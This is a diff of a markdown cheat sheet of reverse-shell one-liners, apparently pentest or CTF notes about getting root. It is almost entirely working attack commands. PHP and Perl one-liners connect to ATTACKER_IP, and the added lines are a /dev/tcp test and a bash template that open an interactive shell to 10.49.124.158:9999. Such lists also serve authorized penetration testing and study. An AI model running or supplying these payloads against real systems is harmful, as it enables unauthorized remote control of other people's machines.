@@ -1,4 +1,9 @@
 #### We will get root priviles from these
+
+#### test reverse shell
+```bash
+bash -c 'echo test >/dev/tcp/10.49.124.158/9999'
+```
 #### checking for reverse shell
 ```bash
 when we are in target machine check which are present there to get reverse shell
@@ -43,4 +48,9 @@ php -r '$sock=fsockopen("ATTACKER_IP",4545);exec("/bin/sh -i <&3 >&3 2>&3");'
 #### Perl
 ```bash
 perl -e 'use Socket;$i="ATTACKER_IP";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+```
+#### Template
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.49.124.158/9999 0>&1
 ```
